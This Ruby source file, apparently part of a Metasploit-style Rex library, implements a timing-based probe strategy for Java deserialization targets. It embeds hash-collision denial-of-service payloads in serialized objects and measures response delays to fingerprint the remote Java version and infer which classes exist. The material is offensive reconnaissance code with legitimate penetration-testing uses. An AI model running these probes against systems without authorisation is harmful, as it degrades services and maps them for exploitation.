# -*- coding: binary -*-

require 'rex/java/serialization/payloads'

module Rex
  module Java
    module Serialization
      module Probe
        P = Rex::Java::Serialization::Payloads
        class TimingProbeStrategy < ProbeStrategy
          def initialize(t)
            super(t)
          end

          def init(ctx)
            reg = Rex::Java::Serialization::Metamodel::Registry.new()
            reg.load('model/base-java9.json')
            @thresh = 1.6
            baseline = time { @test.call('foobar', reg, ctx.params) }
            @lastt = baseline
            @testDepth = 0

            for nestDepth in 5..15
              t = time { @test.call(P::DOS.make_hash_dos(2 * nestDepth), reg, ctx.params) }
              if t > 3 * @lastt
                @lastt = t
                @testDepth = nestDepth * 2
                break
              else
                @lastt = t
              end
            end

            puts '[I] Using DOS depth ' + @testDepth.to_s + ' baseline time ' + baseline.to_s + ' test time ' + @lastt.to_s

            pmodel = nil
            @@probeModels.each do |model|
              reg = Model::Registry.new()
              reg.load('model/base-java9.json')
              reg.load(model)

              p =  P::Probe.make_probe_test(P::DOS.make_hash_dos(@testDepth))

              t = time { @test.call(p, reg, ctx.params) }

              next if t < 0.4 * @lastt

              pmodel = model
              break
            end

            raise 'No support for remote java version' if pmodel.nil?

            ctx.reg.load(pmodel)
          end

          def time
            start = Time.now.to_f
            yield
            Time.now.to_f - start
          end

          def run(probe, ctx)
            obj = probe.make(self)
            reg = ctx.reg
            reg = probe.reg unless probe.reg.nil?
            t = time { @test.call(obj, reg, ctx.params) }

            # if the probe does not trigger one hashdos instance,
            # something is wrong
            if t < 0.75 * @lastt
              raise 'Inconsitent timing results'
            elsif (t > @thresh * @lastt) != probe.invert
              probe.false(ctx)
              return false
            else
              probe.true(ctx)
              return true
            end
          end

          def make_exists(cname)
            P::Probe.make_eventlistenerlist_probe(cname,
                                                  P::DOS.make_hash_dos(@testDepth),
                                                  P::DOS.make_hash_dos(@testDepth))
          end

          def make_deser(obj)
            Model::JavaArray.new('Ljava/lang/Object;', [
              P::DOS.make_hash_dos(@testDepth),
              obj,
              P::DOS.make_hash_dos(@testDepth)
            ])
          end
        end
      end
    end
  end
end
